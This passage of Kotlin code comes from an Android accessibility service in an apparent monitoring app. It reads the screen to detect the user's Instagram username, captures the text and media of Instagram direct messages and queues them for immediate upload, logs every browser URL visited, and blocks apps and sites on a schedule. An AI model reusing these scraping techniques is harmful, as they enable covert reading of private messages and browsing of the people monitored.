                        topCandidates.add(Pair(t, r))
                    }
                }

                val cd = node.contentDescription?.toString()?.trim()
                if (!cd.isNullOrBlank()) {
                    allTexts.add(cd)
                    val r = Rect()
                    node.getBoundsInScreen(r)
                    if (r.top < 500 && r.height() in 15..250) {
                        topCandidates.add(Pair(cd, r))
                    }
                }

                // Crucial for Instagram feed posts & reels: hintText = "Add a comment as <username>..."
                val hint = node.hintText?.toString()?.trim()
                if (!hint.isNullOrBlank()) {
                    allTexts.add(hint)
                }

                val vId = node.viewIdResourceName
                if (!vId.isNullOrBlank()) {
                    if (vId.endsWith(":id/row_user_primary_name") ||
                        vId.endsWith(":id/action_bar_title") ||
                        vId.endsWith(":id/action_bar_large_title") ||
                        vId.endsWith(":id/action_bar_textview_title") ||
                        vId.endsWith(":id/username") ||
                        vId.endsWith(":id/profile_tab")
                    ) {
                        val txt = node.text?.toString()?.trim() ?: node.contentDescription?.toString()?.trim()
                        if (!txt.isNullOrBlank()) {
                            viewIdCandidates.add(txt)
                        }
                    }
                }

                for (i in 0 until node.childCount) {
                    traverseNodes(node.getChild(i))
                }
            }
            traverseNodes(root)

            var detectedUsername: String? = null

            val reserved = setOf(
                "instagram", "direct", "messages", "search", "explore", "reels", "threads",
                "meta", "camera", "chats", "calls", "following", "followers", "edit profile",
                "share profile", "notifications", "settings", "activity", "close friends",
                "posts", "saved", "archive", "qr code", "audio", "video", "primary", "general",
                "requests", "notes", "new message", "create", "options", "more options", "back",
                "professional dashboard", "tools", "insights", "ad tools", "switch accounts",
                "add account", "log in", "log out", "accounts", "profile", "home", "search & explore",
                "uninstall", "security", "music", "danger", "tab", "double tap", "like", "reply",
                "send", "view", "comment"
            )

            // STRATEGY 1: Feed / Post / Reels Comment Box Placeholder (e.g. "Add a comment as <username>...", "Comment as <username>...")
            // On Instagram Home Feed, every post has a comment box with this exact placeholder!
            // Directly works on the Home Feed without user clicking Profile or Message icon!
            for (text in allTexts) {
                val match = "(?i)(?:add\\s+a\\s+comment\\s+as|comment\\s+as|replying\\s+as|posting\\s+as|sharing\\s+as|logged\\s+in\\s+as|signed\\s+in\\s+as|continue\\s+as)\\s+@?([a-zA-Z0-9._]+)".toRegex().find(text)
                if (match != null) {
                    val candidate = match.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                    if (candidate.length in 3..32 && !reserved.contains(candidate) && candidate.matches("^[a-zA-Z0-9._]+$".toRegex())) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            // STRATEGY 2: In-App Account Switcher Dialog / Bottom Sheet
            // When user switches accounts via long-press profile or chevron, the switcher sheet lists accounts directly.
            val isSwitcherSheet = allTexts.any {
                it.contains("Switch accounts", ignoreCase = true) ||
                it.contains("Choose an account", ignoreCase = true) ||
                it.contains("Add account", ignoreCase = true) ||
                it.contains("Log into existing account", ignoreCase = true)
            }
            if (detectedUsername == null && isSwitcherSheet) {
                for (cand in viewIdCandidates + allTexts) {
                    val clean = cand.removePrefix("@").trim().lowercase()
                    if (clean.length in 3..32 &&
                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !clean.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(clean)
                    ) {
                        detectedUsername = clean
                        break
                    }
                }
            }

            // STRATEGY 3: Bottom Navigation Bar Profile Tab ContentDescription
            // e.g. "Profile for <user>", "<user>'s profile"
            if (detectedUsername == null) {
                for (text in allTexts) {
                    val match1 = "(?i)(?:profile\\s+(?:for|of|tab)?\\s*[:,-]?\\s*@?([a-zA-Z0-9._]+))".toRegex().find(text)
                    if (match1 != null) {
                        val candidate = match1.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                        if (candidate.length in 3..32 && !reserved.contains(candidate) && !candidate.startsWith("tab") && !candidate.matches("^[0-9]+$".toRegex())) {
                            detectedUsername = candidate
                            break
                        }
                    }
                    val match2 = "(?i)@?([a-zA-Z0-9._]+)(?:'s)?\\s+profile(?:,\\s*tab)?".toRegex().find(text)
                    if (match2 != null) {
                        val candidate = match2.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                        if (candidate.length in 3..32 && !reserved.contains(candidate) && !candidate.startsWith("tab") && !candidate.matches("^[0-9]+$".toRegex())) {
                            detectedUsername = candidate
                            break
                        }
                    }
                }
            }

            // STRATEGY 4: Action Bar Title / View IDs (e.g. action_bar_title)
            if (detectedUsername == null && viewIdCandidates.isNotEmpty()) {
                for (cand in viewIdCandidates) {
                    val clean = cand.removePrefix("@").trim().lowercase()
                    if (clean.length in 3..32 &&
                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !clean.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(clean)
                    ) {
                        detectedUsername = clean
                        break
                    }
                }
            }

            // STRATEGY 5: Own Profile Screen Detection (when visited)
            val isOwnProfile = allTexts.any {
                it.contains("Edit profile", ignoreCase = true) ||
                it.contains("Share profile", ignoreCase = true) ||
                it.contains("Professional dashboard", ignoreCase = true) ||
                (allTexts.any { t -> t.contains("Followers", ignoreCase = true) } &&
                 allTexts.any { t -> t.contains("Following", ignoreCase = true) })
            }

            if (detectedUsername == null && isOwnProfile) {
                for ((text, rect) in topCandidates) {
                    val candidate = text.removePrefix("@").trim().lowercase()
                    if (rect.top < 450 &&
                        candidate.length in 3..32 &&
                        candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !candidate.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(candidate)
                    ) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            // STRATEGY 6: Direct Messages Inbox Screen Detection (when visited)
            val isDirectInbox = (allTexts.any { it.equals("Direct", ignoreCase = true) || it.equals("Messages", ignoreCase = true) } &&
                allTexts.any { it.contains("Search", ignoreCase = true) || it.contains("Notes", ignoreCase = true) || it.contains("Requests", ignoreCase = true) })

            if (detectedUsername == null && isDirectInbox) {
                for ((text, rect) in topCandidates) {
                    val candidate = text.removePrefix("@").trim().lowercase()
                    if (rect.top < 350 && rect.left < 500 &&
                        candidate.length in 3..32 &&
                        candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !candidate.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(candidate)
                    ) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            if (!detectedUsername.isNullOrBlank()) {
                notifyInstagramAccountDetected(detectedUsername)
            }
        } catch (_: Exception) {}
    }

    fun recordInstagramChatIfForeground(root: AccessibilityNodeInfo?) {
        if (root == null) return
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.instagram.android") return

        detectAndHandleInstagramAccountSwitch(root)

        // Strict verification: ONLY record messages if user is inside an actual Direct Chat with an active text composer!
        fun hasDirectChatComposer(node: AccessibilityNodeInfo?): Boolean {
            if (node == null) return false
            val hint = ((node.text?.toString() ?: "") + " " + (node.contentDescription?.toString() ?: "") + " " + (node.viewIdResourceName ?: "")).trim()
            if (hint.contains("Add a comment", ignoreCase = true) || hint.contains("Comment as", ignoreCase = true)) return false
            if (hint.contains("Message...", ignoreCase = true) || hint.contains("Type a message", ignoreCase = true) || hint.contains("Send message", ignoreCase = true)) return true
            if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) {
                if (hint.contains("comment", ignoreCase = true)) return false
                return true
            }
            for (i in 0 until node.childCount) {
                if (hasDirectChatComposer(node.getChild(i))) return true
            }
            return false
        }
        if (!hasDirectChatComposer(root)) return

        try {
            val entriesToInsert = mutableListOf<InstagramMessageEntry>()
            val now = System.currentTimeMillis()
            val displayMetrics = resources.displayMetrics

            fun extractReelUrl(txt: String?): String? = WhatsAppNotificationListener.extractReelUrl(txt)

            fun findReelUrlInNode(node: AccessibilityNodeInfo?, depth: Int = 0): String? {
                if (node == null || depth > 4) return null
                val t = node.text?.toString()
                val cd = node.contentDescription?.toString()
                extractReelUrl(t)?.let { return it }
                extractReelUrl(cd)?.let { return it }
                for (i in 0 until node.childCount) {
                    val found = findReelUrlInNode(node.getChild(i), depth + 1)
                    if (found != null) return found
                }
                return null
            }

            fun findReelUrlNearby(node: AccessibilityNodeInfo?): String? {
                if (node == null) return null
                findReelUrlInNode(node)?.let { return it }
                node.parent?.let { parent ->
                    findReelUrlInNode(parent)?.let { return it }
                    parent.parent?.let { grandParent ->
                        findReelUrlInNode(grandParent)?.let { return it }
                    }
                }
                return null
            }

            // Find Direct Chat username in top action bar
            val headerNodes = mutableListOf<AccessibilityNodeInfo>()
            fun findHeader(node: AccessibilityNodeInfo?) {
                if (node == null) return
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (rect.top < 380 && node.text != null && node.text.isNotBlank()) {
                    headerNodes.add(node)
                }
                for (i in 0 until node.childCount) {
                    findHeader(node.getChild(i))
                }
            }
            findHeader(root)
            val reservedTitles = setOf("Instagram", "Direct", "Messages", "Reels", "Explore", "Search", "Notifications", "Post", "Posts", "Audio", "Tagged", "Comments", "Likes", "Activity")
            val chatTitle = headerNodes.firstOrNull {
                val s = it.text.toString().trim()
                !reservedTitles.any { res -> res.equals(s, ignoreCase = true) } &&
                !s.contains("Active", ignoreCase = true) &&
                !s.startsWith("Switched to", ignoreCase = true) &&
                !s.startsWith("Switch to", ignoreCase = true) &&
                !s.startsWith("Logged in", ignoreCase = true) &&
                s.length in 2..50
            }?.text?.toString()?.trim()

            if (!chatTitle.isNullOrBlank()) {
                val candidateNodes = mutableListOf<AccessibilityNodeInfo>()
                fun collectMessageNodes(node: AccessibilityNodeInfo?) {
                    if (node == null) return
                    if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
                    val t = node.text?.toString()?.trim()
                    val cd = node.contentDescription?.toString()?.trim()
                    val rect = Rect()
                    node.getBoundsInScreen(rect)

                    // Message bubbles appear between the top header (top > 140) and bottom message composer (bottom <= height - 120)
                    if (rect.top > 140 && rect.bottom <= (displayMetrics.heightPixels - 120)) {
                        val isTextTs = !t.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(t)
                        val isCdTs = !cd.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cd)

                        if (!isTextTs && !isCdTs) {
                            val candidateText = when {
                                !t.isNullOrBlank() -> t
                                !cd.isNullOrBlank() && (cd.contains("reel", ignoreCase = true) || cd.contains("photo", ignoreCase = true) || cd.contains("image", ignoreCase = true) || cd.contains("video", ignoreCase = true)) -> cd
                                else -> null
                            }
                            if (!candidateText.isNullOrBlank() &&
                                !candidateText.equals(chatTitle, ignoreCase = true) &&
                                !candidateText.equals("Message...", ignoreCase = true) &&
                                !candidateText.equals("Search", ignoreCase = true) &&
                                !candidateText.equals("Instagram", ignoreCase = true)
                            ) {
                                candidateNodes.add(node)
                            }
                        }
                    }
                    for (i in 0 until node.childCount) {
                        collectMessageNodes(node.getChild(i))
                    }
                }
                collectMessageNodes(root)

                for (node in candidateNodes) {
                    val t = node.text?.toString()?.trim()
                    val cd = node.contentDescription?.toString()?.trim()
                    val rawText = when {
                        !t.isNullOrBlank() -> t
                        !cd.isNullOrBlank() -> cd
                        else -> continue
                    }
                    if (rawText.isBlank()) continue
                    if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(rawText)) continue

                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    val isOutgoing = rect.left > (displayMetrics.widthPixels * 0.35f) ||
                                     rawText.startsWith("You sent ", ignoreCase = true) ||
                                     rawText.startsWith("You: ", ignoreCase = true)

                    val cleanText = when {
                        rawText.startsWith("You sent ", ignoreCase = true) -> rawText.substring(9).trim()
                        rawText.startsWith("You: ", ignoreCase = true) -> rawText.substring(5).trim()
                        else -> rawText
                    }
                    if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cleanText)) continue

                    val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
                    val isReel = reelUrl != null ||
                        cleanText.contains("reel", ignoreCase = true) ||
                        (cd != null && cd.contains("reel", ignoreCase = true)) ||
                        cleanText.contains("shared a reel", ignoreCase = true) ||
                        cleanText.contains("sent a reel", ignoreCase = true)

                    val isImage = !isReel && (
                        cleanText.contains("photo", ignoreCase = true) ||
                        cleanText.contains("image", ignoreCase = true) ||
                        (cd != null && (cd.contains("photo", ignoreCase = true) || cd.contains("image", ignoreCase = true))) ||
                        cleanText.contains("sent a photo", ignoreCase = true) ||
                        cleanText.contains("shared a photo", ignoreCase = true) ||
                        node.className?.toString()?.contains("ImageView", ignoreCase = true) == true
                    )

                    val isVideo = !isReel && !isImage && (
                        cleanText.contains("video", ignoreCase = true) ||
                        (cd != null && cd.contains("video", ignoreCase = true)) ||
                        cleanText.contains("sent a video", ignoreCase = true)
                    )

                    val itemMediaType = when {
                        isReel -> "reel"
                        isImage -> "image"
                        isVideo -> "video"
                        else -> "text"
                    }

                    val finalText = when {
                        isReel && (cleanText.isBlank() || cleanText.equals("reel", ignoreCase = true)) -> reelUrl ?: "Shared a Reel"
                        isImage && (cleanText.isBlank() || cleanText.equals("photo", ignoreCase = true) || cleanText.equals("sent a photo", ignoreCase = true)) -> "Photo"
                        isVideo && cleanText.isBlank() -> "Video"
                        else -> cleanText
                    }

                    val key = "ig|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
                    if (capturedWhatsAppMsgHashes.add(key)) {
                        entriesToInsert.add(
                            InstagramMessageEntry(
                                chatName = chatTitle,
                                sender = if (isOutgoing) "me" else chatTitle,
                                messageText = finalText,
                                isOutgoing = isOutgoing,
                                messageTimeEpochMs = now,
                                mediaType = itemMediaType,
                                reelUrl = reelUrl,
                                targetAccount = null
                            )
                        )
                    }
                }
            }

            if (entriesToInsert.isNotEmpty()) {
                scope.launch {
                    try {
                        val db = AppDatabase.getInstance(applicationContext)
                        db.instagramMessageDao().insertAll(entriesToInsert)
                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                    } catch (e: Exception) {
                        Log.e("BlockA11y", "Failed to insert captured Instagram messages", e)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Re-checks the URL bar every ~1.5s while a browser stays foreground —
     * this is what catches navigating to a different site within the same
     * browser window, which never fires its own TYPE_WINDOW_STATE_CHANGED.
     * Cancelled the moment any other app's window comes to the foreground
     * (stopBrowserPolling, above), so it never runs while the user isn't
     * actually in a browser.
     */
    private fun startBrowserPolling() {
        if (browserPollRunnable != null) return // already running
        val runnable = object : Runnable {
            override fun run() {
                recordUrlIfEnabled(null, rootInActiveWindow)
                checkWebsiteRules()
                pollHandler.postDelayed(this, browserPollIntervalMs)
            }
        }
        browserPollRunnable = runnable
        pollHandler.postDelayed(runnable, browserPollIntervalMs)
    }

    private fun stopBrowserPolling() {
        browserPollRunnable?.let { pollHandler.removeCallbacks(it) }
        browserPollRunnable = null
    }

    private fun loadedRules(): List<BlockRule> {
        if (!::rulesCache.isInitialized) rulesCache = BlockRulesCache(applicationContext)
        return rulesCache.load()
    }

    private fun checkAppRule(packageName: String) {
        val rules = loadedRules()
        if (rules.isEmpty()) return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()

        rules.firstOrNull { it.ruleType == "app" && it.target == packageName }
            ?.let { rule ->
                if (rule.isActiveNow(dayAbbrev, minutesOfDay)) {
                    blockForeground(rule, packageName)
                }
            }
    }

    private fun checkWebsiteRules() {
        val websiteRules = loadedRules().filter { it.ruleType == "website" }
        if (websiteRules.isEmpty()) return

        val urlBarText = findUrlBarText(rootInActiveWindow) ?: return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()
        websiteRules.firstOrNull { rule ->
            rule.isActiveNow(dayAbbrev, minutesOfDay) && urlBarText.contains(rule.target, ignoreCase = true)
        }?.let { rule -> blockForeground(rule, urlBarText) }
    }

    // The omnibox shows one of these as hint text (not a real URL) on an
    // empty/new-tab address bar — without filtering these out, every visit
    // to a blank tab got logged as a fake "visit" to literally this phrase.
    private val addressBarHints = listOf(
        "search google or type url",
        "search google or type web address",
        "search or type url",
        "search or type web address",
    )

    /** `event` is only non-null when called from the window-state-changed path — the title comes from there. */
    private fun recordUrlIfEnabled(event: AccessibilityEvent?, root: AccessibilityNodeInfo?) {
        if (!DeviceState(applicationContext).webHistoryTrackingEnabled) return
        val url = findUrlBarText(root) ?: return
        if (addressBarHints.any { url.trim().equals(it, ignoreCase = true) }) return // omnibox hint text, not a visit
        if (url == lastRecordedUrl) return // debounce — same URL re-fires on scroll/focus events
        lastRecordedUrl = url

        // Chrome reports the page's <title> as the window-state event's own
        // text (this is how the tab/window is announced to accessibility
        // services) — separate from the url_bar node, which only has the URL.
        // Not available on a poll tick (no event), so title stays null then.
        val title = event?.text?.firstOrNull()?.toString()?.takeIf { it.isNotBlank() }

        scope.launch {
            try {
                AppDatabase.getInstance(applicationContext).webHistoryDao().insert(
                    WebHistoryEntry(url = url, title = title, visitedAtEpochMs = System.currentTimeMillis())
                )
            } catch (e: Exception) {
                // Dropped — not worth retrying a single missed URL capture.
            }
        }
    }

    private fun findUrlBarText(root: AccessibilityNodeInfo?): String? {
        if (root == null) return null
        for (resourceId in browserUrlBarIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(resourceId)
            val text = nodes?.firstOrNull()?.text?.toString()
            if (!text.isNullOrBlank()) return text
        }
        return null
    }

    private fun blockForeground(rule: BlockRule, matchedTarget: String) {
        // Debounce — one window-state event can fire multiple times in quick
        // succession; avoid spamming Home actions and duplicate violation reports.
        val now = System.currentTimeMillis()
        if (matchedTarget == lastBlockedPackage && now - lastBlockedAt < 2000) return
        lastBlockedPackage = matchedTarget
        lastBlockedAt = now

        // NOT startActivity(ACTION_MAIN/CATEGORY_HOME) — Android's background
        // activity launch restrictions (tightened further on MIUI) silently
        // swallow a Context.startActivity() call made from a Service with no
        // visible UI of its own, so detection fired (the alert below proves
        // it) but nothing visibly happened. performGlobalAction is the
        // accessibility-specific API for this exact case — it simulates the
        // physical Home button press directly through the accessibility
        // layer, not through the activity-launch path, so it isn't subject
        // to that restriction.
        performGlobalAction(GLOBAL_ACTION_HOME)

        BlockViolationWorker.enqueue(applicationContext, rule.id, matchedTarget)
    }

    private fun currentDayAndMinute(): Pair<String, Int> {
        val cal = Calendar.getInstance()
        val dayAbbrev = SimpleDateFormat("EEE", Locale.US).format(cal.time).lowercase()
        val minutesOfDay = cal.get(Calendar.HOUR_OF_DAY) * 60 + cal.get(Calendar.MINUTE)
        return dayAbbrev to minutesOfDay
    }

    override fun onInterrupt() {
        stopBrowserPolling()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.stop(applicationContext)
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        instance = null
        return super.onUnbind(intent)
    }
}
